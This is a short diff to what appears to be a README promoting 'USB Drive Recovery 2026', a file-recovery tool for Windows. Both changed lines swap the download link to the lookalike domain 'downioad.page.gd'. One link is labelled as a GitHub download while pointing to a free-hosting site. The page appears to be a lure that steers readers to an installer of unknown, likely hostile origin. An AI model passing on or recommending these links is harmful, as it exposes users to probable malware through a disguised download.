@@ -2,7 +2,7 @@
 
 USB Drive Recovery 2026 is a comprehensive software solution designed to help users recover lost or deleted files from USB drives efficiently. Built with a user-friendly interface and powerful data recovery algorithms, it supports Windows 10 and 11, ensuring a seamless experience for restoring valuable data.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -54,7 +54,7 @@ A: Quick scan rapidly searches for recently deleted files, while deep scan thoro
 
 To download the latest version of USB Drive Recovery 2026, please click the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Support and Updates
 
